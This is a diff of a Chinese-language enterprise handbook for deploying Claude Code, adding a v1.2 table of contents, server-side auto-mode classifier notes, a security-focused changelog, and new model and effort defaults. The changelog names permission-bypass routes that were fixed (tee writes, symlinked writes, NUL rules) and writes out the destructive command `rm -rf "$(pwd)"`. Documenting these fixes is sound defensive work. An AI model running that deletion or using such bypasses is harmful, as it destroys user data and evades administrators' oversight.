+    - [P-30：大規模平行任務（Dynamic Workflow）](#p-30大規模平行任務dynamic-workflow)
 52. [企業使用標準、Golden Workflow 與結論](#52-企業使用標準golden-workflow-與結論)
+    - [52.1 公司 Claude Code 使用標準（十五條）](#521-公司-claude-code-使用標準十五條建議)
+    - [52.2 Enterprise Claude Code Golden Workflow](#522-enterprise-claude-code-golden-workflow建議)
+    - [52.3 三個層次的檢查清單](#523-三個層次的檢查清單建議)
+    - [52.4 Claude Code 到底改變了什麼](#524-claude-code-到底改變了什麼)
+    - [52.5 最終結論](#525-最終結論)
+    - [52.6 給讀者的最後三句話](#526-給讀者的最後三句話)
 
-### 附錄
+</details>
+
+<details open>
+<summary><strong>補充章節（v1.1 新增，v1.2 擴充）</strong>（第 53–56 章）</summary>
+
+53. [企業 Gateway 架構：LLM Gateway 與 Claude Apps Gateway](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway)
+    - [53.1 Gateway 是什麼、解決什麼問題](#531-gateway-是什麼解決什麼問題official)
+    - [53.2 兩種選擇：Claude Apps Gateway vs. 既有的 LLM Gateway](#532-兩種選擇claude-apps-gateway-vs-既有的-llm-gatewayofficial)
+    - [53.3 🚨 Gateway 與訂閱方案的計費關係](#533--gateway-與訂閱方案的計費關係official)
+    - [53.4 🚨 Gateway 後方會失效或改變的功能](#534--gateway-後方會失效或改變的功能official)
+    - [53.5 Claude Apps Gateway 的存取控制](#535-claude-apps-gateway-的存取控制official)
+    - [53.6 🚨 CI/CD 與無人值守機器的限制](#536--cicd-與無人值守機器的限制official)
+    - [53.7 Gateway 「不」負責的事](#537-gateway-不負責的事official)
+    - [53.8 Claude Apps Gateway 部署實務：定位與開發者連線（v1.2 新增）](#538-claude-apps-gateway-部署實務定位與開發者連線officialv12-新增)
+    - [53.9 `gateway.yaml` 設定重點（v1.2 新增）](#539-gatewayyaml-設定重點officialv12-新增)
+    - [53.10 花費上限（Spend Limits）（v1.2 新增）](#5310-花費上限spend-limitsofficialv12-新增)
+    - [53.11 維運：IdP、容量、故障與升級（v1.2 新增）](#5311-維運idp容量故障與升級officialv12-新增)
+    - [53.12 安全模型與法遵答題參考（v1.2 新增）](#5312-安全模型與法遵答題參考officialv12-新增)
+    - [53.13 AWS 與 Google Cloud 參考架構（v1.2 新增）](#5313-aws-與-google-cloud-參考架構officialv12-新增)
+    - [53.14 既有 LLM Gateway 的導入與相容性（v1.2 新增）](#5314-既有-llm-gateway-的導入與相容性officialv12-新增)
+    - [53.15 本章注意事項](#5315-本章注意事項)
+54. [Provider 專頁深化：Bedrock / Claude Platform on AWS / Vertex / Foundry](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry)
+    - [54.1 為什麼這一章必須存在](#541-為什麼這一章必須存在建議)
+    - [54.2 如何辨識你在哪一欄](#542-如何辨識你在哪一欄official)
+    - [54.3 所有 Provider 都支援的功能](#543-所有-provider-都支援的功能official)
+    - [54.4 🚨 需要 Claude 訂閱的功能（第三方 Provider 一律不可用）](#544--需要-claude-訂閱的功能第三方-provider-一律不可用official)
+    - [54.5 🚨 依 Provider 而異的功能矩陣](#545--依-provider-而異的功能矩陣official)
+    - [54.6 各 Provider 的缺口速查與替代方案](#546-各-provider-的缺口速查與替代方案official)
+    - [54.7 依訂閱方案的功能可用性](#547-依訂閱方案的功能可用性official)
+    - [54.8 模型可用性](#548-模型可用性official)
+    - [54.9 部署選項總覽（third-party-integrations）（v1.2 新增）](#549-部署選項總覽third-party-integrationsofficialv12-新增)
+    - [54.10 Amazon Bedrock 部署細節（v1.2 新增）](#5410-amazon-bedrock-部署細節officialv12-新增)
+    - [54.11 Claude Platform on AWS 部署細節（v1.2 新增）](#5411-claude-platform-on-aws-部署細節officialv12-新增)
+    - [54.12 Google Cloud's Agent Platform 部署細節（v1.2 新增）](#5412-google-clouds-agent-platform-部署細節officialv12-新增)
+    - [54.13 Microsoft Foundry 部署細節（v1.2 新增）](#5413-microsoft-foundry-部署細節officialv12-新增)
+    - [54.14 本章注意事項](#5414-本章注意事項)
+55. [Self-hosted Environments 部署實務（v1.2 新增）](#55-self-hosted-environments-部署實務v12-新增)
+    - [55.1 定位、前提與限制](#551-定位前提與限制official)
+    - [55.2 🚨 上線前的十項強化](#552--上線前的十項強化official)
+    - [55.3 網路需求與出口 proxy](#553-網路需求與出口-proxyofficial)
+    - [55.4 Git 設定三種路線](#554-git-設定三種路線official)
+    - [55.5 映像、容量與版本](#555-映像容量與版本official)
+    - [55.6 客製化：wrapper、lifecycle hooks 與 on-demand runners](#556-客製化wrapperlifecycle-hooks-與-on-demand-runnersofficial)
+    - [55.7 生命週期、關機與已知限制](#557-生命週期關機與已知限制official)
+    - [55.8 Session 身分驗證：讓內部服務信任 session](#558-session-身分驗證讓內部服務信任-sessionofficial)
+    - [55.9 以 CI 驗證 runner 映像](#559-以-ci-驗證-runner-映像official)
+    - [55.10 本章注意事項](#5510-本章注意事項)
+56. [終端機介面、無障礙與個人化（v1.2 新增）](#56-終端機介面無障礙與個人化v12-新增)
+    - [56.1 為什麼企業要關心終端機介面](#561-為什麼企業要關心終端機介面建議)
+    - [56.2 終端機設定：常見症狀與解法](#562-終端機設定常見症狀與解法official)
+    - [56.3 全螢幕渲染（Fullscreen）](#563-全螢幕渲染fullscreenpreview)
+    - [56.4 無障礙：螢幕閱讀器模式與其他輔助設定](#564-無障礙螢幕閱讀器模式與其他輔助設定official)
+    - [56.5 語音聽寫（Voice Dictation）](#565-語音聽寫voice-dictationofficial)
+    - [56.6 Status Line：最便宜的成本與 context 意識工具](#566-status-line最便宜的成本與-context-意識工具official)
+    - [56.7 快捷鍵自訂（Keybindings）](#567-快捷鍵自訂keybindingsofficial)
+    - [56.8 企業標準化建議清單](#568-企業標準化建議清單建議)
+    - [56.9 本章注意事項](#569-本章注意事項)
+
+</details>
+
+<details open>
+<summary><strong>附錄</strong>（8 篇）</summary>
 
 - [附錄 A：AI Agent 十大工程原則](#附錄-aai-agent-十大工程原則)
+  - [原則 1 — Investigate Before Implement（先調查，再修改）](#原則-1--investigate-before-implement先調查再修改)
+  - [原則 2 — Evidence Before Assumption（先證據，再推論）](#原則-2--evidence-before-assumption先證據再推論)
+  - [原則 3 — Plan Before Large Changes（大型變更先計畫）](#原則-3--plan-before-large-changes大型變更先計畫)
+  - [原則 4 — Small Changes Before Large Changes（小步驟優先）](#原則-4--small-changes-before-large-changes小步驟優先)
+  - [原則 5 — Test Before Claiming Success（沒有驗證，不可宣稱完成）](#原則-5--test-before-claiming-success沒有驗證不可宣稱完成)
+  - [原則 6 — Human Owns Architecture（架構責任在人）](#原則-6--human-owns-architecture架構責任在人)
+  - [原則 7 — AI Must Be Reviewable（AI 產出必須可審查）](#原則-7--ai-must-be-reviewableai-產出必須可審查)
+  - [原則 8 — Least Privilege（權限最小化）](#原則-8--least-privilege權限最小化)
+  - [原則 9 — Git Everything（一切可追蹤）](#原則-9--git-everything一切可追蹤)
+  - [原則 10 — Production Requires Human Approval（Production 必須人工核准）](#原則-10--production-requires-human-approvalproduction-必須人工核准)
 - [附錄 B：各角色導入建議](#附錄-b各角色導入建議)
+  - [B.1 開發者（第一週）](#b1-開發者第一週)
+  - [B.2 Tech Lead（第一個月）](#b2-tech-lead第一個月)
+  - [B.3 架構師](#b3-架構師)
+  - [B.4 資安](#b4-資安)
+  - [B.5 平台團隊](#b5-平台團隊)
+  - [B.6 PM / BA](#b6-pm--ba)
+  - [B.7 QA](#b7-qa)
 - [附錄 C：Windows 企業環境快速開始](#附錄-cwindows-企業環境快速開始)
+  - [C.1 IT 預先完成的事項](#c1-it-預先完成的事項)
+  - [C.2 開發者安裝步驟](#c2-開發者安裝步驟)
+  - [C.3 個人設定（`~/.claude/settings.json`）](#c3-個人設定claudesettingsjson)
+  - [C.4 WSL2 路線（若需要 Bash 沙箱）](#c4-wsl2-路線若需要-bash-沙箱)
+  - [C.5 常見 Windows 問題速查](#c5-常見-windows-問題速查)
 - [附錄 D：指令與設定速查表](#附錄-d指令與設定速查表)
+  - [D.1 CLI 指令](#d1-cli-指令)
+  - [D.2 常用旗標](#d2-常用旗標)
+  - [D.3 高頻 Slash Commands](#d3-高頻-slash-commands)
+  - [D.4 企業必設的 Settings](#d4-企業必設的-settings)
+  - [D.5 Hook 事件速查](#d5-hook-事件速查)
+  - [D.6 重要環境變數](#d6-重要環境變數)
 - [附錄 E：FAQ](#附錄-efaq)
 - [附錄 F：版本查證記錄](#附錄-f版本查證記錄)
+  - [F.1 查證資訊](#f1-查證資訊)
+  - [F.2 已逐頁覆核的頁面清單](#f2-已逐頁覆核的頁面清單)
+  - [F.3 標示為【⚠️ 文件不一致】或需自行覆核的項目](#f3-標示為-文件不一致或需自行覆核的項目)
+  - [F.4 已知會隨版本改變、需定期覆核的項目](#f4-已知會隨版本改變需定期覆核的項目)
+  - [F.5 覆核建議節奏](#f5-覆核建議節奏)
+  - [F.6 v1.1 變更摘要](#f6-v11-變更摘要)
+  - [F.7 v1.2 變更摘要](#f7-v12-變更摘要)
 - [附錄 G：新進成員最終 Checklist](#附錄-g新進成員最終-checklist)
+  - [G.1 Day 1：環境](#g1-day-1環境)
+  - [G.2 Day 1：第一個循環](#g2-day-1第一個循環)
+  - [G.3 Week 1：基本操作](#g3-week-1基本操作)
+  - [G.4 Week 1：安全與規範](#g4-week-1安全與規範)
+  - [G.5 Week 1：品質](#g5-week-1品質)
+  - [G.6 Week 2：進階](#g6-week-2進階)
+  - [G.7 Week 2：貢獻](#g7-week-2貢獻)
+  - [G.8 最終確認](#g8-最終確認)
+- [附錄 H：2026 功能演進時間軸（What's New w13–w37）](#附錄-h2026-功能演進時間軸whats-new-w13w37)
+  - [H.1 如何使用這份時間軸](#h1-如何使用這份時間軸建議)
+  - [H.2 季度重點總覽](#h2-季度重點總覽建議)
+  - [H.3 逐週對照表](#h3-逐週對照表official)
+  - [H.4 週報之後（v2.1.270–281，2026-09-12 至 09-23）](#h4-週報之後v212702812026-09-12-至-09-23official)
+
+</details>
 
 ---
 
@@ -516,6 +1203,21 @@ v2.1.195 起再增加：寫入 secret manager、修改 DNS/TLS 憑證、合併�
 >
 > Session 進行中用 `git remote add` 或 `git remote set-url` 新增/改指的 remote **不被信任**。這是刻意的防護：避免惡意內容在 session 中途把 push 目標換成攻擊者的 repo。
 
+> 🚨 **Version Note（v1.2 新增）：分類器預設改在「伺服器端」執行**
+>
+> v2.1.278 起，auto mode 的分類器審查**預設由伺服器端執行**：它是 session 模型請求的一部分，**不另外收取分類器的額外費用**。適用範圍：Enterprise 方案、Claude API 帳號、Claude Platform on AWS、Amazon Bedrock、Google Cloud's Agent Platform、Microsoft Foundry，以及任何把 `ANTHROPIC_BASE_URL` 指向 LLM gateway 或 proxy 的環境。
+>
+> | 情境 | 行為 |
+> | --- | --- |
+> | 伺服器能審查 | 由伺服器的判定決定是否放行 |
+> | 伺服器無法審查（最常見的原因是 **gateway 或 proxy 干擾了流量**，或該平台、區域、憑證尚未支援） | 退回 Claude Code 自己的分類器請求；若整個 session 都維持退回狀態，會在需計費的帳號上顯示**分類器費用通知** |
+> | `CLAUDE_CODE_AUTO_MODE_SERVER=0` | 一律使用本機分類器請求（此時分類器的 token 會計入用量） |
+> | `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1` 且未設定上一個變數 | 同樣不會請求伺服器審查 |
+>
+> 📌 v2.1.281 起，在伺服器端審查的環境中，**唯讀指令與沙箱中的 shell 指令也要等審查結果**，被標記時一樣會被阻擋。可以在 `/status` 的 **Auto mode server** 一列確認本 session 的分類器在哪裡執行。
+>
+> ✅ **企業意義**：走 gateway 的組織要特別注意——**gateway 若修改或過濾請求，可能讓伺服器端審查靜默失效並退回計費的本機分類器**。上線前請在 `/status` 確認，並觀察是否出現分類器費用通知。
+
 #### 2.2.4 企業該怎麼做【建議】
 
 | 你的情境 | 建議做法 |
@@ -568,7 +1270,48 @@ v2.1.195 起再增加：寫入 secret manager、修改 DNS/TLS 憑證、合併�
 | **2.1.268** | 修正 macOS 的 `/etc`、`/tmp`、`/var` 與 Linux 的 `/bin` 等**symlink 目錄的權限規則未以真實路徑套用**的問題 | 🚨 **權限規則繞過修正**，應納入最低版本要求 |
 | **2.1.268** | 修正 WebFetch 無限期停住的問題（現於 **300 秒**後失敗，可用 `CLAUDE_CODE_WEBFETCH_DEADLINE_MS` 覆寫） | 影響 CI 與無人值守流程的逾時設計 |
 
-> ✅ **企業最低版本建議**：綜合 2.1.247（沙箱重新導向）、2.1.251（symlink TOCTOU）與 2.1.268（symlink 權限規則）三項安全修正，**高度管制環境的 `requiredMinimumVersion` 應設為 `2.1.268` 或更高**。設定方式見第 [8.6 節](#86-版本控管與強制升級official)。
+> ✅ **企業最低版本建議（v1.1，⚠️ 已由 v1.2 的 [2.3.2 節](#232-v21269--v21281-補充速覽officialv12-新增) 取代為 2.1.281）**：綜合 2.1.247（沙箱重新導向）、2.1.251（symlink TOCTOU）與 2.1.268（symlink 權限規則）三項安全修正，**高度管制環境的 `requiredMinimumVersion` 應設為 `2.1.268` 或更高**。設定方式見第 [8.6 節](#86-版本控管與強制升級official)。
+
+#### 2.3.2 v2.1.269 – v2.1.281 補充速覽【Official】（v1.2 新增）
+
+本手冊 v1.2 的查證基準更新為 **v2.1.281（2026-09-23）**。下表只列與企業治理、安全、成本相關的項目，完整清單請見官方 changelog：
+
+| 版本 | 變更 | 企業意義 |
+| --- | --- | --- |
+| **2.1.269** | `claude plugin eval` 正式提供：對 plugin 執行 eval 套件並產出可重現的評分（JSON + HTML 報告） | 企業內部 plugin 的**品質閘門**，見第 [21.12 節](#2112-plugin-evals以-eval-套件驗證-pluginofficialv12-新增) |
+| **2.1.269** | `OTEL_METRICS_INCLUDE_REPOSITORY` 為 OTel 指標加上 `vcs.*` repo 屬性 | 可依 repo 歸因成本，見第 [41 章](#41-observability) |
+| **2.1.269** | `CLAUDE_CODE_WORKFLOW_MAX_CONCURRENT_AGENTS`（1–256）調高 Workflow 單次執行的同時 agent 上限 | ⚠️ 成本放大器，建議由 managed settings 控管 |
+| **2.1.269** | 修正以 `!` 開頭的 deny／ask 規則會越出其來源設定檔的問題 | **權限規則範圍修正** |
+| **2.1.269** | 修正 Bash `tee` 寫入的目標檔不受 `Edit()` deny 規則約束的問題 | 🚨 **權限繞過修正** |
+| **2.1.271** | agent frontmatter 新增 `omitClaudeMd`；`claude plugin install/update --accept-command <sha256>` | subagent 可不載入 CLAUDE.md（managed 政策檔仍載入）；plugin 安裝改為「核准確切指令」而非 `-y` |
+| **2.1.271** | `modelPricing` 與 gateway `pricing` 的 `multiplier` 可大於 1（上限 10） | 內部**成本分攤加成**（chargeback） |
+| **2.1.271** | auto mode + 沙箱時，Bash／PowerShell／Monitor 支援**逐指令 `allowed_domains`** | 網路存取改為「隨指令審查、只為該指令開放」 |
+| **2.1.271** | 修正 `managed-mcp.json` 無法解析時被忽略的問題：現在**維持獨占 MCP 控制**並在啟動時警告 | 🚨 fail-closed 行為，見第 [20 章](#20-mcpmodel-context-protocol) |
+| **2.1.273** | LLM gateway 的 hint headers（`x-claude-code-request-class` 等，需 `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`） | gateway 可依請求類型路由與計費，見第 [53 章](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway) |
+| **2.1.273** | 🚨 修正：**同時存在 server-managed settings 時，MDM／`managed-settings.json` 的 `allowManagedMcpServersOnly`、`deniedMcpServers`、`disableClaudeAiConnectors` 被忽略** | **治理失效修正**，混用兩種政策交付的組織必須升級 |
+| **2.1.274** | OTel 新增 `claude_code.managed_settings_resolved` 事件與 `effort` span 屬性 | 可**從遙測驗證政策是否生效**，見第 [41 章](#41-observability) |
+| **2.1.274** | `CLAUDE_CODE_MCP_STARTUP_WAIT_MS`；Bedrock／Vertex／Foundry 改用 v2 MCP client 與 2026-07-28 協定 | 見第 [20 章](#20-mcpmodel-context-protocol) |
+| **2.1.274** | `.mcp.json` 中 `"type": "sdk"` 的項目改為略過並警告 | 只有 SDK 宿主程式能註冊 in-process server |
+| **2.1.275** | 同步 claude.ai 帳號啟用的 skills 與 plugins 到終端機（`syncClaudeAiSkills` / `syncClaudeAiPlugins` 可關閉） | 🚨 **新的擴充來源**，見第 [15.7 節](#157-v12-新增的企業相關設定official) |
+| **2.1.275** | npm 來源的 plugin 改以 `npm pack --ignore-scripts` 取得並驗證完整性 | **供應鏈防護**：套件的 install script 不再執行 |
+| **2.1.277** | 🚨 **原生讀取 `AGENTS.md`** | 見 Version Note 3 與第 [14.8 節](#148-agentsmd-相容official) |
+| **2.1.277** | subagent 的回傳結果改以「subagent 輸出」標頭包裝並縮排 | **prompt injection 防護**：subagent 結果無法偽裝成 session 指示 |
+| **2.1.277** | 移除 `TaskOutput` 工具；`taskOutputMaxChars` 與 `TASK_MAX_OUTPUT_LENGTH` 失效 | 舊設定可移除 |
+| **2.1.278** | auto mode 分類器**預設改為伺服器端** | 見第 [2.2.3 節](#223-auto-mode-的分類器到底擋什麼official) |
+| **2.1.280** | 新增 **Opus 5.5**；Pro 與 Team Standard 預設改為 Opus | 見第 [5.2 節](#52-模型與別名official) |
+| **2.1.280** | `CLAUDE_CODE_MAX_MCP_DESCRIPTION_LENGTH`（預設 2,048 字元） | 限制 MCP 工具描述佔用的 context |
+| **2.1.280** | `PermissionRequest` 事件**不再執行 agent 型 hook** | 見第 [19 章](#19-hooks) |
+| **2.1.280** | 拒絕模仿保留名稱的 plugin marketplace | 供應鏈防護 |
+| **2.1.280** | 🚨 修正：**經 symlink 的寫入**以樹內路徑判斷，導致 `acceptEdits`、allow 規則與 auto mode 放行了落在樹外的寫入 | **權限繞過修正** |
+| **2.1.281** | `"attribution": false` 隱藏所有 commit／PR 署名 | 見第 [15.7 節](#157-v12-新增的企業相關設定official) |
+| **2.1.281** | MCP URL-mode elicitation；`claude plugin validate` 檢查 MCP 設定 | 見第 [20 章](#20-mcpmodel-context-protocol) |
+| **2.1.281** | `--dangerously-skip-permissions` 與 auto mode 下，危險 `rm` 的提示**等候 2 分鐘後自動拒絕**並附改寫建議 | 無人值守流程不再卡住，見第 [22 章](#22-permission-model-與-permission-modes) |
+| **2.1.281** | 🚨 修正：`rm -rf "$(pwd)"` 這類目標只來自指令替換的遞迴刪除，在 auto／bypass 模式下**不經詢問就執行** | **破壞性操作修正** |
+| **2.1.281** | 🚨 修正：含 NUL 字元的權限規則被展開成萬用比對 | **權限規則修正** |
+| **2.1.281** | self-hosted runner 改以私有檔案傳遞 system prompt | 包裝腳本須改用 `--system-prompt-file`，見第 [55 章](#55-self-hosted-environments-部署實務v12-新增) |
+| **2.1.281** | Claude Apps Gateway：Bedrock 上游支援 `assume_role` 與 `guardrail`；`desktop` 政策區塊支援 `blockReadsOutsideWorkingDirectories`、`disableBypassPermissionsMode` | 見第 [53 章](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway) |
+
+> ✅ **企業最低版本建議（v1.2 更新）**：v2.1.269–281 之間有多項**權限繞過與治理失效**的修正（`tee` 寫入、symlink 寫入、NUL 規則、`rm -rf "$(pwd)"`、server-managed 與 MDM 並存時 MCP 政策被忽略）。**高度管制環境的 `requiredMinimumVersion` 應提高到 `2.1.281`**；混用 server-managed settings 與 MDM 的組織，**至少要 `2.1.273`**。
 
 ### 2.4 如何確認你自己的版本行為【Official】
 
@@ -649,7 +1392,7 @@ flowchart TD
         PERM --> TOOLS
     end
 
-    HARNESS --> MODEL["Claude 模型<br/>Opus 5 / Sonnet 5 / Haiku 4.5 / Fable 5.1"]
+    HARNESS --> MODEL["Claude 模型<br/>Opus 5.5 / Sonnet 5 / Haiku 4.5 / Fable 5.1"]
     MODEL --> HARNESS
 
     TOOLS --> FS["檔案系統<br/>Read · Edit · Write · Glob · Grep"]
@@ -877,7 +1620,7 @@ flowchart LR
 | **桌面 App** | ✅ macOS / Windows / Linux(beta) | ✅ Copilot app | 【Community】 | ✅ |
 | **Web / 雲端 session** | ✅ claude.ai/code（research preview） | ✅ github.com、Copilot cloud agent | 【Community】 | 【Community】 |
 | **行動裝置** | ✅ iOS / Android app | ✅ GitHub Mobile | 【Community】 | 【Community】 |
-| **專案指令檔** | `CLAUDE.md` + `.claude/rules/` | `.github/copilot-instructions.md`、`AGENTS.md`、`*.instructions.md` | 【Community】 | 【Community】`.cursorrules` |
+| **專案指令檔** | `CLAUDE.md` + `.claude/rules/`；v2.1.277+ 無 `CLAUDE.md` 時讀 `AGENTS.md` | `.github/copilot-instructions.md`、`AGENTS.md`、`*.instructions.md` | 【Community】 | 【Community】`.cursorrules` |
 | **自動記憶** | ✅ Auto Memory（四種 type） | ✅ Memory | 【Community】 | 【Community】 |
 | **Skills** | ✅ `.claude/skills/<name>/SKILL.md` | ✅ `.github/skills/<name>/SKILL.md` | 【Community】 | 【Community】 |
 | **Subagents** | ✅ `.claude/agents/*.md` | ✅ Custom Agents `.agent.md` | 【Community】 | 【Community】 |
@@ -975,7 +1718,7 @@ Claude Code 可透過以下任一途徑取得存取：
 
 個人方案為 Free / Pro / Max；組織方案為 Team / Enterprise。
 
-> 🚨 **採購前必讀**：部分 Claude Code 功能**需要 claude.ai 帳號**，無法只靠 Console API key 或雲端供應商憑證使用，包含 Claude Code on the web、Routines、Code Review、Remote Control、Chrome 擴充。若貴司決定走 Bedrock / Vertex / Foundry，必須**另外規劃**開發者是否也需要 Teams / Enterprise 座位。詳見第 [4.5 節](#45-enterprise-ai-agent-team-設計)。
+> 🚨 **採購前必讀**：部分 Claude Code 功能**需要 claude.ai 帳號**，無法只靠 Console API key 或雲端供應商憑證使用，包含 Claude Code on the web、Routines、Code Review、Remote Control、Chrome 擴充。若貴司決定走 Bedrock / Vertex / Foundry，必須**另外規劃**開發者是否也需要 Teams / Enterprise 座位。詳見第 [4.5 節](#45-一個常被忽略的落差provider-會影響功能可用性official)。
 
 ### 5.2 模型與別名【Official】
 
@@ -983,25 +1726,40 @@ Claude Code 可透過以下任一途徑取得存取：
 
 | 別名 | 解析為 |
 | --- | --- |
-| `default` | 依帳號類型：Max / Enterprise / API → Opus 5；Pro / Team Standard → Sonnet 5 |
-| `best` | Fable（可用時）或 Opus |
-| `fable` | Fable 5.1 或 Fable 5（最強能力，適合長時間 session） |
-| `opus` | 最新的 Opus |
+| `default` | **不是模型別名**，而是「清除覆寫、回到帳號類型的執行期預設」（見下表） |
+| `best` | Fable（可用時）或與 `opus` 相同 |
+| `fable` | Fable 5.1（Claude Apps Gateway session 中為 Fable 5；可用 `ANTHROPIC_DEFAULT_FABLE_MODEL` 覆寫） |
+| `opus` | 最新的 Opus（Anthropic API 上為 **Opus 5.5**） |
 | `sonnet` | 最新的 Sonnet |
 | `haiku` | 快速的 Haiku 模型 |
-| `opus[1m]` / `sonnet[1m]` | 100 萬 token context window |
+| `opus[1m]` / `sonnet[1m]` | 100 萬 token context window（`sonnet` 已解析為原生 1M 的 Sonnet 5 時，`[1m]` 無作用） |
 | `opusplan` | 規劃用 Opus、執行用 Sonnet |
 
 各 Provider 上 `opus` / `sonnet` 實際解析到的版本**不同**：
 
 | Provider | `opus` | `sonnet` |
 | --- | --- | --- |
-| Anthropic API | Opus 5 | Sonnet 5 |
-| Claude Platform on AWS | Opus 5 | Sonnet 4.6 |
-| Amazon Bedrock、Google Cloud's Agent Platform | Opus 5 | Sonnet 4.5 |
+| Anthropic API | **Opus 5.5** | Sonnet 5 |
+| Claude Platform on AWS | **Opus 5.5** | Sonnet 4.6 |
+| Amazon Bedrock、Google Cloud's Agent Platform | **Opus 5.5** | Sonnet 4.5 |
 | Microsoft Foundry | Opus 4.6 | Sonnet 4.5 |
 
-> ⚠️ **這張表是很多「同一個 prompt 在不同環境結果不同」問題的根因。** 企業若同時有多個 Provider，請在 CLAUDE.md 或內部規範中**明確指定完整 model ID**，不要只寫別名。
+`default` 依帳號類型解析的結果（v2.1.280 起）：
+
+| 帳號類型／Provider | `default` 解析為 |
+| --- | --- |
+| Pro、Max、Team（Standard 與 Premium）、Enterprise、Anthropic API | **Opus 5.5** |
+| Claude Platform on AWS、Amazon Bedrock、Google Cloud's Agent Platform | **Opus 5.5** |
+| Microsoft Foundry | Sonnet 4.5 |
+
+> 🚨 **Version Note（v1.2 新增）：Pro 與 Team Standard 的預設模型已由 Sonnet 改為 Opus**
+>
+> - **v2.1.280 之前**：Pro 與 Team Standard 預設 Sonnet 5；Max、Team Premium、Enterprise 與 API 預設 Opus 5。
+> - **v2.1.280（2026-09-22）起**：**所有訂閱方案與 API 一律預設 Opus 5.5**（`claude-opus-5-5`，1M context，每百萬 token 輸入 $4、輸出 $20，cache 讀取 $0.20）。
+>
+> 對企業的影響：在管理員沒有任何動作的情況下，**Team Standard 座位的每 token 成本與額度消耗輪廓會改變**。若預算以 Sonnet 估算，請改用 managed settings 的 `model` 或組織預設模型（Enterprise）明確指定。Opus 5.5 需要 **Claude Code v2.1.280 以上**；Opus 5 需要 v2.1.219 以上；Sonnet 5 需要 v2.1.197 以上。
+
+> ⚠️ **這張表是很多「同一個 prompt 在不同環境結果不同」問題的根因。** 企業若同時有多個 Provider，請在 CLAUDE.md 或內部規範中**明確指定完整 model ID**（例如 `claude-opus-5-5`），或設定 `ANTHROPIC_DEFAULT_OPUS_MODEL`／`ANTHROPIC_DEFAULT_SONNET_MODEL` 釘選版本，不要只寫別名。📌 `ANTHROPIC_BASE_URL` 只改變請求送往哪裡，**不改變由哪個模型回答**。
 
 ### 5.3 模型設定的優先順序【Official】
 
@@ -1010,25 +1768,59 @@ Claude Code 可透過以下任一途徑取得存取：
 2. claude --model <alias|name>（啟動時）
 3. ANTHROPIC_MODEL 環境變數
 4. settings 檔的 "model"
-5. ANTHROPIC_DEFAULT_MODEL   （新 session 的預設）
+5. ANTHROPIC_DEFAULT_MODEL   （新 session 的預設，v2.1.236+）
 ```
+
+補充規則：
+
+- `/model` 在 picker 按 `Enter` 會**寫入 `~/.claude/settings.json` 的 `model`** 成為預設；按 `s` 只套用本 session。
+- `-p` 模式中的 `/model` 只影響當次 session，不會存成預設。
+- **組織預設模型**（Enterprise，claude.ai 管理後台設定，可依自訂角色）只是起點，會被 `--model`、`ANTHROPIC_MODEL`、managed settings 與使用者的 `model` 蓋過；管理員若開啟「覆寫使用者選擇」，則使用者層的 `model` 只在當次 session 有效。組織預設模型**只作用於 Anthropic API 認證的 session**，走 LLM Gateway 或第三方 Provider 時請改用 managed settings 的 `model`。
+- 新 session「換回別的模型」的常見原因：只選了本 session（`s`）、被更高優先權覆寫（啟動畫面會列出是哪個設定檔）、`~/.claude/settings.json` 無法寫入、或使用 `--resume` 沿用了舊 session 的模型。
 
 ### 5.4 Effort Level（推理投入程度）【Official】
 
-支援的模型：Fable 5.1、Fable 5、Opus 5、Sonnet 5、Opus 4.8、Opus 4.7、Opus 4.6、Sonnet 4.6。
+各模型支援的等級不同：
+
+| 模型 | 可用等級 | 預設 |
+| --- | --- | --- |
+| Fable 5.1、Fable 5 | `low`、`medium`、`high`、`xhigh`、`max` | `high` |
+| **Opus 5.5** | `low`、`medium`、`high`、`xhigh`、`max` | 🚨 **`medium`** |
+| Opus 5、Sonnet 5、Opus 4.8 | `low`、`medium`、`high`、`xhigh`、`max` | `high` |
+| Opus 4.7 | `low`、`medium`、`high`、`xhigh`、`max` | `xhigh` |
+| Opus 4.6、Sonnet 4.6 | `low`、`medium`、`high`、`max` | `high` |
 
 | 等級 | 適用情境 |
 | --- | --- |
 | `low` | 快速、對延遲敏感、不複雜的任務 |
-| `medium` | 對成本敏感、可接受品質取捨 |
-| `high` | **預設**；平衡用量與智慧 |
+| `medium` | 對成本敏感、可接受品質取捨（**Opus 5.5 的預設**） |
+| `high` | 平衡用量與智慧（Opus 5.5 與 Opus 4.7 以外所有模型的預設） |
 | `xhigh` | 更深入的推理，token 花費更高 |
-| `max` | 最深入的推理（容易過度思考） |
-| `ultracode` | Dynamic workflows + xhigh 推理 |
+| `max` | 最深入的推理（容易過度思考）；除非用環境變數設定，否則只套用當次 session |
+| `ultracode` | **不是模型等級**，而是 Claude Code 設定：送出 `xhigh`，並讓 Claude 對實質任務編排 Dynamic Workflows |
 
-設定方式：`/effort`、`--effort <level>`、`CLAUDE_CODE_EFFORT_LEVEL`、settings 的 `effortLevel`。
+設定方式：`/effort`、`--effort <level>`、`CLAUDE_CODE_EFFORT_LEVEL`、settings 的 `effortLevel`，以及依模型分開儲存的 `modelSettings`。
 
-企業可用 `maxEffortLevel` 設定上限（可全域或分模型）。
+解析順序（`ultracode` 關閉時，取第一個成立者）：
+
+1. 明確選擇：`CLAUDE_CODE_EFFORT_LEVEL`、`--effort`、session 中的 `/effort`
+2. 設定：`modelSettings` 中該模型的等級，或 `effortLevel` 鍵
+3. 模型自身的預設（見上表）；Enterprise 若為組織預設模型設了預設 effort，則以其為準
+
+> ⚠️ **Version Note（v1.2 新增）：舊的 `effortLevel` 對 Opus 5.5 不生效**
+>
+> `/effort` 自 v2.1.280 起**依模型分開儲存**（寫在使用者設定的 `modelSettings`）。使用者設定檔中**頂層的 `effortLevel`**（舊格式）仍套用在 Opus 5、Fable 5.1 等舊模型上，但**對 Opus 5.5 與之後的新模型不生效**——它們會從自己的預設（Opus 5.5 為 `medium`）開始。
+>
+> 反之，**project、local、managed settings 或 `--settings` 中的頂層 `effortLevel` 仍然套用到所有模型**。企業若想讓 Opus 5.5 以 `high` 運行，請寫在 managed settings，而不是要求開發者個人設定。
+>
+> 另外，Opus 5.5 與 Fable **無法關閉 thinking**：session 開關、`alwaysThinkingEnabled` 與 `MAX_THINKING_TOKENS=0` 對它們都沒有作用，由模型依 effort 自行決定每一步的思考量。
+
+企業上限有兩種，同時存在時取**較低者**：
+
